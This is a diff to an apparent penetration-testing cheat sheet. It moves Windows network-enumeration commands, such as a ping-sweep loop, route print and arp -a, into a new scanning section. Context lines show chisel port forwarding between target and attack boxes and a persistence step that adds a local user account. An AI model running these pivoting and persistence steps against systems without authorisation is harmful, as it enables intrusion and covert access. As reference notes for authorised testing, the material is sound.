@@ -9,13 +9,9 @@
     dir /r    
     tree /a /f  
     
-    netstat /anto   
-    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
-    route print 
-    arp -a   
+    netstat /anto    
     netsh firewall show state 
     netsh firewall show config
-    C:\Windows\System32\drivers\etc\host        Windows DNS entries 
     
 ## Powershell
     Get-ExecutionPolicy    
@@ -142,6 +138,13 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
 ### Chisel Local Port Forward 
     target    ./chisel server -p LISTEN_PORT 
     attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
+ ## Network Scanning / Enum 
+ [Static Windows binaries](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows) 
+ 
+    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
+    route print 
+    arp -a  
+    C:\Windows\System32\drivers\etc\host        Windows DNS entries  
  ____
  # Persistence
      net user USERNAME PASSWORD /add
